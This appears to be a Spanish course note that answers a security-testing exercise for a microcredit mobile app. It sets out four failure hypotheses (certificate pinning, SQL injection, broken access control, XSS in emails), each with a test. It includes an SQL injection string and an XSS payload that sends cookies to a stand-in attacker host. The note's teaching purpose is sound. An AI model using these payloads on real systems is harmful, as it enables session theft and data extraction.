> [!example] Enunciado
> Una empresa gestiona microcréditos: los usuarios pueden invertir dinero (renta tipo plazo fijo) o solicitar préstamos, mediante una **aplicación nativa mobile** con API REST propia. Sin autenticarse se puede ver un resumen de créditos otorgados, tasa promedio y últimas 10 operaciones (sin datos del prestatario). Para invertir se registran datos de tarjeta o cuenta bancaria. Los pagos se gestionan con un proveedor externo (DummyPay); la app ejecuta directamente llamadas al API de ese proveedor. Se notifica por email el vencimiento de inversiones/cuotas.
>
> Establecer 4 hipótesis de falla pertinentes basadas en problemas de seguridad en aplicaciones, con prueba concreta para cada una.

**Conceptos:**

* [[Certificate Pinning]]
* [[CWE-89 - SQL Injection]]
* [[Broken Access Control]]
* [[CWE-79 - XSS]]

**Hipótesis 1: Falta de [[Certificate Pinning]] → Exposición de datos financieros y API key de DummyPay**
- Por qué: La app llama directamente al API de DummyPay; sin certificate pinning, un atacante puede interceptar todo el tráfico, incluyendo la API key y los datos de tarjeta/cuenta en tránsito.
- Prueba: Emulador con proxy (Burp Suite) y certificado instalado; iniciar una inversión y verificar si el proxy intercepta el tráfico HTTPS hacia DummyPay.

**Hipótesis 2: [[CWE-89 - SQL Injection|SQL Injection]] en el endpoint público de operaciones**
- Por qué: El resumen público de operaciones probablemente tiene parámetros (`limit`, filtros) que se traducen en queries; sin parametrizar, se puede inyectar SQL para extraer datos que no deberían ser públicos (como la identidad de los prestatarios).
- Prueba: Inyectar SQL en los parámetros del endpoint público, por ejemplo `?limit=10' OR '1'='1`, y verificar si devuelve más resultados o datos de otras tablas.

**Hipótesis 3: [[Broken Access Control]] en operaciones de otros usuarios**
- Por qué: Si los endpoints de operaciones (inversiones, préstamos) solo verifican autenticación y no propiedad, un usuario podría acceder a operaciones ajenas cambiando IDs.
- Prueba: Interceptar `GET /api/operaciones/{id}` propio y cambiar el ID por otro; verificar si devuelve datos de operaciones ajenas.

**Hipótesis 4: XSS a través de emails de notificación**
- Por qué: Si algún campo controlado por el usuario se incluye sin sanitizar en el email de vencimiento, un atacante puede inyectar HTML/JavaScript que se ejecute al abrir el email en un webmail.
- Prueba: Registrarse con un nombre que contenga `<script>fetch('https://atacante.com/?c='+document.cookie)</script>`, realizar una operación, y verificar si el email renderiza el script sin sanitizar.
